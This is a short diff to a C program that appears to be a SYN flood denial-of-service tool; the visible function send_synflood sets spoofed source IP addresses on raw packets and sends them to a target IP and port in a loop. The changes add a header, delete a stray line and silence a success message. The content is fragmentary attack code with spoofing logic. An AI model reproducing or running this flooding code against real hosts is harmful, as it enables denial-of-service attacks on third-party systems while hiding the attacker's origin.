@@ -5,6 +5,7 @@
 #include<netinet/in.h>
 #include<arpa/inet.h>
 #include <pthread.h>
+#include <unistd.h>
 #include "header.h"
 
 char *dest_ip;
@@ -81,12 +82,11 @@ void *send_synflood(void *tmp){
         strcat(source_ip, buffer);
         iph->saddr=inet_addr(source_ip);
 
-        send the packet
         if(sendto(*fd, packet, iph->tot_len, 0, (struct sockaddr *)&to, sizeof(to))<0){
             printf("Sending error");
         }
         else {
-            printf("Sended to %s:%d\n",dest_ip,dest_port);
+           // printf("sent to %s:%d\n",dest_ip,dest_port);
         }
     }
     
